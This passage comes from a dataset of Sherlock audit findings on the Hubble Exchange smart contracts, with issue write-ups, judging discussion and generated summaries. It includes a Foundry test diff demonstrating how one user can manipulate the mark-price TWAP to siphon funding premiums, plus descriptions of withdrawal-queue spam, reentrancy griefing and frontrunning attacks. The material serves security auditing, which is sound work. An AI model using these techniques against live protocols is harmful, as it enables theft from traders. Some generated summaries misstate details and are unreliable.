call.\n\nRecommend checking #160 as well.\n\nand I leave the #158 as a separate issue because the root cause is the returned call data is emitted in the contract code itself\n\n**asquare08**\n\nyes noted. #160 has slightly different cause but same effect. So the solution for all these related issues is\n* don't save data in variable #158 \n* cap the gas limit of .call #160\n* [this](https://github.com/sherlock-audit/2023-04-hubble-exchange-judging/issues/153#issuecomment-1640346418)\n\n\n**IAm0x52**\n\nEscalate\n\nAs the sponsor has pointed out, this is a different issue from the dupes. While the outcome of wasting gas is similar, the root cause is completely different. The root cause for this is reentrancy across functions, while the root cause of issues marked as dupes is that there is no gas limit. I suggest that this issue be separated and the dupes groped together as separate issues.\n\nEdit:\nMissed #195. That and this should be considered a separate issue\n\n**sherlock-admin2**\n\n > Escalate\n> \n> As the sponsor has pointed out, this is a different issue from the dupes. While the outcome of wasting gas is similar, the root cause is completely different. The root cause for this is reentrancy across functions, while the root cause of issues marked as dupes is that there is no gas limit. I suggest that this issue be separated and the dupes groped together as separate issues.\n> \n> Edit:\n> Missed #195. That and this should be considered a separate issue\n\nYou've created a valid escalation!\n\nTo remove the escalation from consideration: Delete your comment.\n\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\n\n**ctf-sec**\n\nSee escalation https://github.com/sherlock-audit/2023-04-hubble-exchange-judging/issues/116\n\nThere are a lot of ways to consume all gas in external call (reentrancy to expand the queue size, gas token, for loop, swap, etc....), cannot count each of them as duplicates \n\nI think grouping all these issue about wasting gas in external call to one issue make sense, root cause is gas limit not capped.\n\n**0xArcturus**\n\n Agreed with escalation, \nas also mentioned in [#195](https://github.com/sherlock-audit/2023-04-hubble-exchange-judging/issues/195), the root cause of this is the lack of reentrancy guard and the `withdrawals.length` changing during execution. This attack can bloat the queue by reentering with a single withdraw call, while the dupes are focused on consuming gas in a single call.\n\n**hrishibhat**\n\nResult:\nMedium\nHas duplicates\nAgree with the escalation that this should be a separate issue along with #195 \n\n**sherlock-admin2**\n\nEscalations have been resolved successfully!\n\nEscalation status:\n- [IAm0x52](https://github.com/sherlock-audit/2023-04-hubble-exchange-judging/issues/153/#issuecomment-1643577079): accepted",
      "summary": "\nThis bug report is about malicious user griefing withdrawing users via VUSD reentrancy. Two users, 0x3e84fa45 and 0x52, found an issue in the VUSD.sol contract that allows a malicious user to withdraw VUSD to a malicious contract, deposit the received gas token, and immediately withdraw it. This would lengthen the queue and force users to process all the malicious withdrawals before being able to process their own. The root cause of this issue is that both mintWithReserve and withdraw/withdrawTo lack the reentrant modifier allowing malicious reentrancy. The impact of this vulnerability is that malicious user can maliciously reenter VUSD to grief users via unnecessary gas wastage. The recommended solution is to add the nonreentrant modifer to mintWithReserve withdraw and withdrawTo. After discussion and review, the escalations were accepted and the bug was marked as medium with duplicates.",
      "quality_score": 5,
      "rarity_score": 5,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Hubble Exchange",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-04-hubble-exchange-judging/issues/153",
      "tags": [
        "Reentrancy"
      ],
      "finders": [
        "0x52",
        "0x3e84fa45"
      ]
    },
    {
      "id": "20691",
      "title": "M-6: Malicious user can control premium emissions to steal margin from other traders",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2023-04-hubble-exchange-judging/issues/87 \n\n## Found by \ndirk\\_y\n## Summary\nA malicious user can force premiums to be applied in a positive direction for their positions. They can effectively steal margin from other traders that have filled the other side of their positions.\n\n## Vulnerability Detail\nThis vulnerability stems from how the premiums are calculated when `settleFunding` is called in `AMM.sol`:\n\n```solidity\nint256 premium = getMarkPriceTwap() - underlyingPrice;\n```\n\nEffectively, the premium for a position is calculated based on the difference between the perpetual maker TWAP and the oracle TWAP. Under the hood, `getMarkPriceTwap` calls `_calcTwap`, which calculates the TWAP price from the last hour to the current block timestamp:\n\n```solidity\n        uint256 currentPeriodStart = (_blockTimestamp() / spotPriceTwapInterval) * spotPriceTwapInterval;\n        uint256 lastPeriodStart = currentPeriodStart - spotPriceTwapInterval;\n\n        // If there is no trade in the last period, return the last trade price\n        if (markPriceTwapData.lastTimestamp <= lastPeriodStart) {\n            return markPriceTwapData.lastPrice;\n        }\n\n        /**\n        * check if there is any trade after currentPeriodStart\n        * since this function will not be called before the nextFundingTime,\n        * we can use the lastPeriodAccumulator to calculate the twap if there is a trade after currentPeriodStart\n        */\n        if (markPriceTwapData.lastTimestamp >= currentPeriodStart) {\n            // use the lastPeriodAccumulator to calculate the twap\n            twap = markPriceTwapData.lastPeriodAccumulator / spotPriceTwapInterval;\n        } else {\n            // use the accumulator to calculate the twap\n            uint256 currentAccumulator = markPriceTwapData.accumulator + (currentPeriodStart - markPriceTwapData.lastTimestamp) * markPriceTwapData.lastPrice;\n            twap = currentAccumulator / spotPriceTwapInterval;\n        }\n```\n\nThis method works closely in conjunction with `_updateTWAP` which is called every time a new position is opened based on the fill price. I'll talk more about his in the \"Recommendation\" section, but the core issue is that too much weight is placed on the last price that was filled, along with the fact the user can open uncapped positions. As can be seen from the `_calcTwap` method above, if there has not been a recently opened position, then the TWAP is determined as the last filled price. And naturally, a time weighted price isn't weighted by the size of a fill as well, so the size of the last fill has no impact.\n\nAs a result of this, a malicious user can place orders (which should then be executed by the validators) at a price that maximises the difference between the market TWAP and the oracle TWAP in order to maximise the premiums generated in the market. If the malicious user opens up a large enough position, the premiums generated exceed the taker/maker fees for opening positions. And since the same user can place orders for both sides of the market, they do not need to increase their margin requirement over time in order to meet the minimum margin requirements. Effectively the user is able to generate free revenue assuming the price of the underlying asset doesn't significantly deviate in the opposite direction of the large position held by the user.\n\nBelow is a diff to the existing test suite with a test case that shows how a malicious user could control premiums to make a profit. It can be run with `forge test -vvv --match-path test/foundry/OrderBook.t.sol`:\n\n```diff\ndiff --git a/hubble-protocol/test/foundry/OrderBook.t.sol b/hubble-protocol/test/foundry/OrderBook.t.sol\nindex b4dafdf..f5d36b2 100644\n--- a/hubble-protocol/test/foundry/OrderBook.t.sol\n+++ b/hubble-protocol/test/foundry/OrderBook.t.sol\n@@ -228,6 +228,60 @@ contract OrderBookTests is Utils {\n         assertPositions(bob, -size, quote, 0, quote * 1e18 / stdMath.abs(size));\n     }\n \n+    function testUserCanControlEmissions() public {\n+        uint256 price = 1e6;\n+        oracle.setUnderlyingPrice(address(wavax), int(uint(price)));\n+\n+        // Calculate how much margin required for 100x MIN_SIZE\n+        uint256 marginRequired = orderBook.getRequiredMargin(100 * MIN_SIZE, price) * 1e18 / uint(defaultWethPrice) + 1e10; // required weth margin in 1e18, add 1e10 for any precision loss\n+        \n+        // Let's say Alice is our malicious user, and Bob is a normal user\n+        addMargin(alice, marginRequired, 1, address(weth));\n+        addMargin(bob, marginRequired, 1, address(weth));\n+\n+        // Alice places a large legitimate long order that is matched with a short order from Bob\n+        placeAndExecuteOrder(0, aliceKey, bobKey, MIN_SIZE * 90, price, true, false, MIN_SIZE * 90, false);\n+\n+        // Alice's free margin is now pretty low\n+        int256 availabeMargin = marginAccount.getAvailableMargin(alice);\n+        assertApproxEqRel(availabeMargin, 200410, 0.1e18); // Assert within 10%\n+\n+        // Calculate what's the least we could fill an order for given the oracle price\n+        uint256 spreadLimit = amm.maxOracleSpreadRatio();\n+        uint minPrice = price * (1e6 - spreadLimit) / 1e6;\n+\n+        // Alice can fill both sides of an order at the minimum fill price calculated above, with the minimum size\n+        // Alice would place such orders (and hopefully have them executed) just after anyone else makes an order in a period (1 hour)\n+        // The goal for Alice is to keep the perpetual TWAP as low as possible vs the oracle TWAP (since she holds a large long position)\n+        // In quiet market conditions Alice just has to make sure she's the last person to fill\n+        // In busy market conditions Alice would fill an order immediately after anyone else fills an order\n+        // In this test Alice fills an order every 2 periods, but in reality, if nobody was trading then Alice wouldn't have to do anything provided she was the last filler\n+        for (uint i = 0; i < 100; i++) {\n+            uint256 currentPeriodStart = (block.timestamp / 1 hours) * 1 hours;\n+\n+            // Warp to before the end of the period\n+            vm.warp(currentPeriodStart + 3590);\n+            \n+            // Place and execute both sides of an order as Alice\n+            // Alice can do this because once both sides of the order are executed, the effect to her free margin is 0\n+            // As mentioned above, Alice would place such orders every time after another order is executed\n+            placeAndExecuteOrder(0, aliceKey, aliceKey, MIN_SIZE, minPrice, true, false, MIN_SIZE, false);\n+            \n+            // Warp to the start of the next period\n+            vm.warp(currentPeriodStart + (3600 * 2) + 10);\n+            \n+            // Funding is settled. This calculates the premium emissions by comparing the perpetual twap with the oracle twap\n+            orderBook.settleFunding();\n+        }\n+\n+        // Alice's margin is now significantly higher (after just 200 hours) because she's been pushing the premiums in her direction\n+        availabeMargin = marginAccount.getAvailableMargin(alice);\n+        assertApproxEqRel(availabeMargin, 716442910, 0.1e18); // Assert within 10%\n+\n+    }\n+\n     function testLiquidateAndExecuteOrder(uint64 price, uint120 size_) public {\n         vm.assume(price > 10 && size_ != 0);\n         oracle.setUnderlyingPrice(address(wavax), int(uint(price)));\n\n``` \n\n## Impact\nA user can effectively steal funds from other traders that are filling the other side of their positions. The larger the position the malicious user is able to fill and the longer the period, the more funds can be credited to the malicious user's margin account.\n\n## Code Snippet\nhttps://github.com/sherlock-audit/2023-04-hubble-exchange/blob/main/hubble-protocol/contracts/AMM.sol#L255-L258\nhttps://github.com/sherlock-audit/2023-04-hubble-exchange/blob/main/hubble-protocol/contracts/AMM.sol#L501-L503\n\n## Tool used\nManual Review\n\n## Recommendation\nI originally thought the best way to mitigate this kind of attack is to scale the TWAP calculation based on the filled amount vs the total fill amount of the whole market. However the downside with this approach is that the fill amount will perpetually increase (given it's a perpetual market after all!) and so the market TWAP deviations from the oracle TWAP would decrease and so the premium emissions would also decrease over time. This could be argued as a feature in that early users receive a larger premium than later users.\n\nUpon further thought I think the best way to prevent this kind of attack is simply to disincentivise the malicious user from doing so; by making this a net-loss situation. This can be done with a combination of the following:\n\n- Increasing minimum order size\n- Increasing trader/maker fees\n- Introducing another fixed fee per order (rather than only variable rate fees)\n- Capping the maximum position size (both long and short)\n- Reducing the maximum price deviation of fill prices from oracle price\n- Increasing the minimum margin requirements\n\nThis will vary per perpetual market, but the key thing that needs to be accomplished is that the cost to a user to place orders to control the market TWAP is greater than the premium that can be obtained from their position. This will also require some estimates as to how frequently users are going to be placing orders. If orders are relatively infrequent then increasing the TWAP calculation from 1 hour will also help with this.\n\nIt is also worth considering whether the following lines in `_calcTwap` are overly weighted towards the last fill price:\n\n```solidity\n       // If there is no trade in the last period, return the last trade price\n        if (markPriceTwapData.lastTimestamp <= lastPeriodStart) {\n            return markPriceTwapData.lastPrice;\n        }\n```\n\nYou could make the argument that if no trades have occurred in a significant period of time then the market TWAP should revert back to the oracle TWAP and premium emissions should halt. This could either be after one empty period, or X number of empty periods to be defined by Hubble.\n\nFinally, having a trader able to hold both sides of the same perpetual in the same order makes this attack easier to implement, so it might be worth adding an extra check to prevent this. However it's worth noting the same could be achieved with 2 accounts assuming they alternated the long/short positions between them to avoid excessive margin requirements. So I'm not sure this is strictly necessary.\n\n\n\n## Discussion\n\n**asquare08**\n\nThis is a scenario of low liquidity where no trade has happened in the last 1 hour and if happened, a malicious user has made a trade just after that to move the price up/down. Many other systems might also fail in such a scenario.\nAlso, only validators can match the placed orders and the malicious user will not always get their desired price unless the validator picks their short and long orders. Hence we can change the severity to `medium`\n\n**ctf-sec**\n\nChanged the severity to medium\n\n**MarkuSchick**\n\nEscalate\n\nThe market manipulation the user is referring to is a dublicate of the funding rate manipulation raised in https://github.com/sherlock-audit/2023-04-hubble-exchange-judging/issues/183: \n`2. Manipulation of funding rate`.\n\nAccording to [other comments](https://github.com/sherlock-audit/2023-04-hubble-exchange-judging/issues/183#issuecomment-1643652209) funding rate manipulation is a low severity issue.\n\n**sherlock-admin2**\n\n > Escalate\n> \n> The market manipulation the user is referring to is a dublicate of the funding rate manipulation raised in https://github.com/sherlock-audit/2023-04-hubble-exchange-judging/issues/183: \n> `2. Manipulation of funding rate`.\n> \n> According to [other comments](https://github.com/sherlock-audit/2023-04-hubble-exchange-judging/issues/183#issuecomment-1643652209) funding rate manipulation is a low severity issue.\n\nYou've created a valid escalation!\n\nTo remove the escalation from consideration: Delete your comment.\n\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\n\n**djb15**\n\nIn my (biased) opinion I think the medium (not low) severity argument for the other issue is that you would need multiple validators to be malicious which is highly unlikely (**in a normal market environment**).\n\nIn this issue **any** user can open orders to manipulate the funding rate, but this is only possible in low liquidity scenarios which is why it is a medium severity issue.\n\nA single malicious validator would be able to do the same thing as is detailed in this report in low liquidity market environments, which would make these two issues identical. Hence why I think both should be medium severity.\n\n**asquare08**\n\nAs mentioned in the comment [here](https://github.com/sherlock-audit/2023-04-hubble-exchange-judging/issues/87#issuecomment-1640419190), its a valid medium issue. Also refer to [this](https://github.com/sherlock-audit/2023-04-hubble-exchange-judging/issues/183#issuecomment-1665745210) comment\n\n**hrishibhat**\n\nResult:\nMedium\nUnique\nConsidering this a valid medium issue\n\n**sherlock-admin2**\n\nEscalations have been resolved successfully!\n\nEscalation status:\n- [MarkuSchick](https://github.com/sherlock-audit/2023-04-hubble-exchange-judging/issues/87/#issuecomment-1643704754): rejected",
      "summary": "\nThis bug report is about a vulnerability in the Hubble Exchange, which is a decentralized exchange (DEX) built on the Ethereum blockchain. A malicious user can force premiums to be applied in a positive direction for their positions, allowing them to effectively steal margin from other traders that have filled the other side of their positions. \n\nThe vulnerability stems from how the premiums are calculated when the `settleFunding` function is called in the `AMM.sol` contract. This method works closely in conjunction with `_updateTWAP`, which is called every time a new position is opened based on the fill price. The issue is that too much weight is placed on the last price that was filled, along with the fact the user can open uncapped positions. As a result, a malicious user can place orders at a price that maximises the difference between the market TWAP and the oracle TWAP in order to maximise the premiums generated in the market. This allows them to generate free revenue, assuming the price of the underlying asset doesn't significantly deviate in the opposite direction of the large position held by the user.\n\nThe impact of this vulnerability is that a user can effectively steal funds from other traders that are filling the other side of their positions. The larger the position the malicious user is able to fill and the longer the period, the more funds can be credited to the malicious user's margin account.\n\nThe code snippet is available at https://github.com/sherlock-audit/2023-04-hubble-exchange/blob/main/hubble-protocol/contracts/AMM.sol#L255-L258 and https://github.com/sherlock-audit/2023-04-hubble-exchange/blob/main/hubble-protocol/contracts/AMM.sol#L501-L503. Manual review was used to find the bug.\n\nThe recommended way to mitigate this kind of attack is to make it a net-loss situation for the malicious user. This can be done by increasing minimum order size, increasing trader/maker fees, introducing another fixed fee per order, capping the maximum position size, reducing the maximum price deviation of fill prices from oracle price, and increasing the minimum margin requirements. It is also worth considering whether the lines in `_calcTwap` are overly weighted towards the last",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Hubble Exchange",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-04-hubble-exchange-judging/issues/87",
      "tags": [],
      "finders": [
        "dirk\\_y"
      ]
    },
    {
      "id": "20690",
      "title": "M-5: min withdraw of 5 VUSD is not enough to prevent DOS via VUSD.sol#withdraw(amount)",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2023-04-hubble-exchange-judging/issues/81 \n\n## Found by \n0xbepresent, lil.eth, p-tsanev\n## Summary\n\nA vulnerability exists where a malicious user spam the contract with numerous withdrawal requests (e.g., 5,000). This would mean that genuine users who wish to withdraw their funds may find themselves unable to do so in a timely manner because the processing of their withdrawals could be delayed significantly.\n\n## Vulnerability Detail\nThe issue stems from the fact that there is no restriction on the number of withdrawal requests a single address can make. A malicious actor could repeatedly call the withdraw or withdrawTo function, each time with a small amount (min 5 VUSD), to clog the queue with their withdrawal requests.\n```solidity\n    //E Burn vusd from msg.sender and queue the withdrawal to \"to\" address\n    function _withdrawTo(address to, uint amount) internal {\n        //E check min amount\n        require(amount >= 5 * (10 ** 6), \"min withdraw is 5 vusd\"); //E @audit-info not enough to prevent grief\n        //E burn this amount from msg.sender\n        burn(amount); // burn vusd from msg.sender\n        //E push \n        withdrawals.push(Withdrawal(to, amount * 1e12));\n    }\n```\nGiven the maxWithdrawalProcesses is set to 100, and the withdrawal processing function processWithdrawals doesn't have any parameter to process from a specific index in the queue, only the first 100 requests in the queue would be processed at a time.\n```solidity\n    uint public maxWithdrawalProcesses = 100;\n    //E create array of future withdrawal that will be executed to return\n    function withdrawalQueue() external view returns(Withdrawal[] memory queue) {\n        //E check if more than 100 requests in withdrawals array\n        uint l = _min(withdrawals.length-start, maxWithdrawalProcesses);\n        queue = new Withdrawal[](l);\n\n        for (uint i = 0; i < l; i++) {\n            queue[i] = withdrawals[start+i];\n        }\n    }\n```\nIn the case of an attack, the first 100 withdrawal requests could be those of the attacker, meaning that the genuine users' requests would be stuck in the queue until all of the attacker's requests have been processed. Moreover the fact that we can only withdraw up to 1 day long when our withdraw request is good to go.\n\n## Impact\n\nThis could result in significant delays for genuine users wanting to withdraw their funds, undermining the contract's usability and users' trust in the platform.\n## Code Snippet\nhttps://github.com/sherlock-audit/2023-04-hubble-exchange/blob/main/hubble-protocol/contracts/VUSD.sol#L88\n\n## Tool used\n\nManual Review\n\n## Recommendation\nEither limit number of withdrawal requests per address could be a first layer of defense even if it's not enough but I don't see the point why this limit is included so removing it could mitigate this.\nOtherwise you could implement a priority queue regarding amount to be withdrawn",
      "summary": "\nThis bug report concerns a vulnerability in the VUSD.sol contract, which is part of the Hubble Exchange platform. The vulnerability allows malicious users to spam the contract with numerous withdrawal requests, potentially clogging the queue and delaying the withdrawal requests of genuine users. \n\nThe issue is caused by the lack of a restriction on the number of withdrawal requests an address can make. A malicious actor could repeatedly call the withdraw or withdrawTo function, each time with a small amount (min 5 VUSD). As the maxWithdrawalProcesses is set to 100, and the withdrawal processing function processWithdrawals doesn't have any parameter to process from a specific index in the queue, only the first 100 requests in the queue would be processed at a time. This means that the genuine users' requests would be stuck in the queue until all of the attacker's requests have been processed. \n\nThe impact of this vulnerability could be significant delays for genuine users wanting to withdraw their funds, undermining the contract's usability and users' trust in the platform. The bug was found by 0xbepresent, lil.eth, and p-tsanev, and the code snippet can be found at https://github.com/sherlock-audit/2023-04-hubble-exchange/blob/main/hubble-protocol/contracts/VUSD.sol#L88. The bug was identified through manual review.\n\nRecommendations for mitigating the vulnerability include either limiting the number of withdrawal requests per address, or implementing a priority queue regarding the amount to be withdrawn.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Hubble Exchange",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-04-hubble-exchange-judging/issues/81",
      "tags": [],
      "finders": [
        "0xbepresent",
        "lil.eth",
        "p-tsanev"
      ]
    },
    {
      "id": "20689",
      "title": "M-4: Malicious user can frontrun withdrawals from Insurance Fund to significantly decrease value of shares",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2023-04-hubble-exchange-judging/issues/72 \n\n## Found by \n0xDjango, Delvir0, carrotsmuggler, dirk\\_y, lil.eth, rogue-lion-0619\n## Summary\nWhen a user withdraws from the insurance fund, the value of their shares is calculated based on the balance of vUSD in the fund. Another user could deliberately frontrun (or frontrun by chance) the withdrawal with a call to `settleBadDebt` to significantly reduce the vUSD returned from the withdrawal with the same number of shares.\n\n## Vulnerability Detail\nWhen a user wants to withdraw from the insurance pool they have to go through a 2 step withdrawal process. First they need to unbond their shares, and then they have to wait for the pre-determined unbonding period before they can withdraw the vUSD their shares are worth by calling `withdraw`.\n\nWhen a user calls `withdraw` the amount of vUSD to redeem is calculated as:\n\n```solidity\namount = balance() * shares / totalSupply();\n```\n\nwhere `balance()` is the balance of vUSD in the contract and `totalSupply()` is the total supply of share tokens. Therefore, if the balance of vUSD in the contract were to decrease, then the amount of vUSD redeemed from the same number of shares would decrease as a result.\n\nThis occurs when a trader's bad debt is settled when calling `settleBadDebt` in `MarginAccount.sol` as this calls `insuranceFund.seizeBadDebt` under the hood, which in turn calls `settlePendingObligation` which transfers vUSD out of the insurance fund to the margin account:\n\n```solidity\nvusd.safeTransfer(marginAccount, toTransfer);\n```\n\nThe result is now that the balance of vUSD in the insurance fund is lower and thus the shares are worth less vUSD as a consequence.\n\n## Impact\nA user withdrawing from the insurance fund could receive significantly less (potentially 0) vUSD when finalising their withdrawal.\n\n## Code Snippet\nhttps://github.com/sherlock-audit/2023-04-hubble-exchange/blob/main/hubble-protocol/contracts/InsuranceFund.sol#L215\nhttps://github.com/sherlock-audit/2023-04-hubble-exchange/blob/main/hubble-protocol/contracts/InsuranceFund.sol#L259-L261\nhttps://github.com/sherlock-audit/2023-04-hubble-exchange/blob/main/hubble-protocol/contracts/InsuranceFund.sol#L153-L161\n\n## Tool used\nManual Review\n\n## Recommendation\nOne option would be to include a slippage parameter on the `withdraw` and `withdrawFor` methods so that the user redeeming shares can specify the minimum amount of vUSD they would accept for their shares.\n\nWhen depositing into the insurance fund, the number of shares to mint is actually calculated based on the total value of the pool (value of vUSD and all other collateral assets). Therefore, the withdraw logic could also use `_totalPoolValue` instead of `balance()` to get a \"true\" value per share, however this could lead to withdrawals failing while assets are up for auction. Assuming all the assets are expected to be sold within the short 2 hour auction duration, this is probably the better solution given the pricing is more accurate, but it depends if users would accept failed withdrawals for short periods of time.\n\n\n\n## Discussion\n\n**asquare08**\n\nWithdrawals done after `settleBadDebt` and before the end of the auction of the seized collateral, will receive less USDC as compared to withdrawals done after the auction has ended.\nHowever, a user deliberately cannot front run all withdrawals with `settleBadDebt` as it will required generating bad debt first. Hence, the severity can be changed to `low`\n\n**ctf-sec**\n\nEmm worth checking the duplicate as well, the duplicate highlights the total supply can be inflated to make user mint less share as well\n\nroot cause is the totalSupply() can be inflated by transferring asset directly\n\nfor example duplicate #144, #224\n\nrecommend maintaining high severity\n\n**ctf-sec**\n\nComment from senior Watson\n\nTotal supply can be inflated by donation but that would distribute the funds to other users in the pool making this a bigger loss than any kind of gain. \n\nAssuming they owned the entire pool, which the only way to make donating profitable, the victim wouldn't lose any value because the donated assets would be auctioned.\n\nWhen burning, donation of other assets doesn't affect the amount of vUSD received.\n\nBest case I see for this is medium since there is potential for withdraws to be frontrun by calls to settle bad debt. Since there is no way to create bad debt arbitrarily it would be dependent on bad debt already existing but being unclaimed:\n\n\n\n**asquare08**\n\nagree with the above commnet",
      "summary": "\nThis bug report is about malicious users frontrunning withdrawals from the Insurance Fund in order to reduce the value of shares. The vulnerability occurs when a user calls `withdraw` to redeem their shares. The amount of vUSD to redeem is calculated based on the balance of vUSD in the fund, and if the balance of vUSD in the contract were to decrease, then the amount of vUSD redeemed from the same number of shares would decrease as a result. This occurs when a trader's bad debt is settled when calling `settleBadDebt` in `MarginAccount.sol` as this calls `insuranceFund.seizeBadDebt` under the hood, which in turn calls `settlePendingObligation` which transfers vUSD out of the insurance fund to the margin account. As a result, a user withdrawing from the insurance fund could receive significantly less (potentially 0) vUSD when finalising their withdrawal.\n\nA possible solution to this issue is to include a slippage parameter on the `withdraw` and `withdrawFor` methods so that the user redeeming shares can specify the minimum amount of vUSD they would accept for their shares. Another option is to use `_totalPoolValue` instead of `balance()` to get a \"true\" value per share, however this could lead to withdrawals failing while assets are up for auction. \n\nIt is also worth noting that a user deliberately cannot front run all withdrawals with `settleBadDebt` as it will require generating bad debt first. Therefore, the severity of the issue can be changed to `low`. However, it is also important to note that total supply can be inflated by donation, which would distribute the funds to other users in the pool making this a bigger loss than any kind of gain. Therefore, it is recommended to maintain a high severity rating for this issue.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Hubble Exchange",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-04-hubble-exchange-judging/issues/72",
      "tags": [
        "Front-Running"
      ],
      "finders": [
        "carrotsmuggler",
        "rogue-lion-0619",
        "0xDjango",
        "dirk\\_y",
        "lil.eth",
        "Delvir0"
      ]
    },
    {
      "id": "20688",
      "title": "M-3: Setting stable price in oracle can result in arbitrate opportunities and significant bad debt if the stable depegs",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2023-04-hubble-exchange-judging/issues/69 \n\n## Found by \nBauchibred, dirk\\_y, kutugu, lil.eth, minhtrng, n1punp, oakcobalt, p12473, rogue-lion-0619\n## Summary\nIn `Oracle.sol` there is the ability for governance to manually specify the price of an underlying asset (designed for stable coins). However, when the given stable coin depegs there is now the opportunity for arbitrage and even the possibility that Hubble becomes insolvent.\n\n## Vulnerability Detail\nFirstly, it is worth noting that stable coins depeg relatively frequently. For the sake of argument let's say that a stable coin is pegged to the US Dollar and the price is set by governance to `1000000` (to 6 decimal places) in the oracle.\n\nProbably the most important place in the protocol where the price of an asset is used is in `MarginAccount` in the `weightedAndSpotCollateral` method. This method is used under the hood to check whether a user can withdraw from the margin account and whether the user is able to be liquidated. It is also used in the AMM logic but I'll focus on the margin account case as I think that is the easiest to exploit.\n\nLet's now say that the stable coin depegs from its $1 price. Now, a user that has already used this stable coin as collateral in the margin account should have a lower value of collateral and therefore could be at risk of being liquidated. However, because the price of the stable coin is manually pegged to $1, the unhealthy trader's position will still appear healthy. If the stable coin failed to return to it's previous $1 value then even if the price of the stable coin was changed by governance to reflect the new lower value, the amount of bad debt accrued by Hubble would be huge at the time of liquidation/settlement.\n\nThe other scenario that will be used more actively by malicious users is that they will acquire the depegged stable coin from another source at its depegged value (e.g. $0.9). The malicious user can then deposit this stable coin into the Hubble margin account at the hard coded value of $1, and open positions with a value that should ordinarily put the trader into a bad debt position.\n\n## Impact\nA short term stable coin depeg event will result in accounts not being liquidated when they should be, and it will allow users to gain from arbitrage trades where they purchase a stable coin at its depegged price and are offered a higher price in Hubble.\n\nA permanent depeg will result in a huge amount of bad debt in Hubble and would likely cause the protocol to become insolvent due to the inability to perform liquidations during the downward price movement.\n\n## Code Snippet\nhttps://github.com/sherlock-audit/2023-04-hubble-exchange/blob/main/hubble-protocol/contracts/Oracle.sol#L30-L32\nhttps://github.com/sherlock-audit/2023-04-hubble-exchange/blob/main/hubble-protocol/contracts/Oracle.sol#L172\n\n## Tool used\nManual Review\n\n## Recommendation\nI would recommend not having the option to manually set and read the price of a stable coin. Yes, you protect accounts from being liquidated from a short term depeg event, however it is precisely in these volatile market periods that accounts should be able to be liquidated to prevent Hubble from accruing too much bad debt, particularly if the depeg is permanent, in which case it will likely cause Hubble to become insolvent.\n\n\n\n## Discussion\n\n**asquare08**\n\nWe are using stable price mechanism just for our testnet. We will use actual USDC price for the mainnet.",
      "summary": "\nThis bug report is about a potential issue with the Hubble Exchange protocol, where setting a stable price in the Oracle contract can result in arbitrate opportunities and significant bad debt if the stable coin depegs. This was found by Bauchibred, dirk_y, kutugu, lil.eth, minhtrng, n1punp, oakcobalt, p12473, and rogue-lion-0619. \n\nThe problem occurs when a stable coin depegs from its original price, and a user has already used this stable coin as collateral in the margin account. The user's position will still appear healthy, even though the stable coin has depegged, because the price is manually pegged to the original value. This can lead to the user being able to open positions with a value that should ordinarily put the trader into a bad debt position.\n\nA short term stable coin depeg event will result in accounts not being liquidated when they should be, and it will allow users to gain from arbitrage trades. A permanent depeg will result in a huge amount of bad debt in Hubble and would likely cause the protocol to become insolvent due to the inability to perform liquidations during the downward price movement. \n\nThe recommendation is to not have the option to manually set and read the price of a stable coin. This will protect accounts from being liquidated from a short term depeg event, and prevent Hubble from accruing too much bad debt, particularly if the depeg is permanent.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Hubble Exchange",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-04-hubble-exchange-judging/issues/69",
      "tags": [],
      "finders": [
        "rogue-lion-0619",
        "p12473",
        "oakcobalt",
        "kutugu",
        "dirk\\_y",
        "lil.eth",
        "Bauchibred",
        "minhtrng",
        "n1punp"
      ]
    },
    {
      "id": "20687",
      "title": "M-2: `Chainlink.latestRoundData()` may return stale results",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2023-04-hubble-exchange-judging/issues/18 \n\n## Found by \n0x3e84fa45, 0xbepresent, 0xmuxyz, 0xpinky, 0xvj, Bauer, Breeje, BugBusters, BugHunter101, Hama, Kaiziron, MohammedRizwan, PRAISE, Vagner, carrotsmuggler, crimson-rat-reach, darkart, dimulski, dirk\\_y, kutugu, lemonmon, lil.eth, minhtrng, osmanozdemir1, p-tsanev, rogue-lion-0619, shtesesamoubiq, tsvetanovv\n## Summary\n\nThe [Oracle.getUnderlyingPrice()](https://github.com/sherlock-audit/2023-04-hubble-exchange/blob/main/hubble-protocol/contracts/Oracle.sol#L24C14-L24C32) function is used to get the price of tokens, the problem is that [the function](https://github.com/sherlock-audit/2023-04-hubble-exchange/blob/main/hubble-protocol/contracts/Oracle.sol#L33) does not check for stale results.\n\n## Vulnerability Detail\n\nThe [Oracle.getUnderlyingPrice()](https://github.com/sherlock-audit/2023-04-hubble-exchange/blob/main/hubble-protocol/contracts/Oracle.sol#L24C14-L24C32) function is used in [InsuranceFund](https://github.com/sherlock-audit/2023-04-hubble-exchange/blob/main/hubble-protocol/contracts/InsuranceFund.sol), [MarginAccount](https://github.com/sherlock-audit/2023-04-hubble-exchange/blob/main/hubble-protocol/contracts/MarginAccount.sol) and [AMM](https://github.com/sherlock-audit/2023-04-hubble-exchange/blob/main/hubble-protocol/contracts/AMM.sol) contracts. The `Oracle.getUnderlyingPrice()` helps to determine the tokens prices managed in the contracts.\n\nThe problem is that there is not check for stale data. There are some [reasons](https://ethereum.stackexchange.com/questions/133242/how-future-resilient-is-a-chainlink-price-feed/133843#133843) that the price feed can become stale.\n\n## Impact\n\nSince the token prices are used in many contracts, stale data could be catastrophic for the project.\n\n## Code Snippet\n\nThe 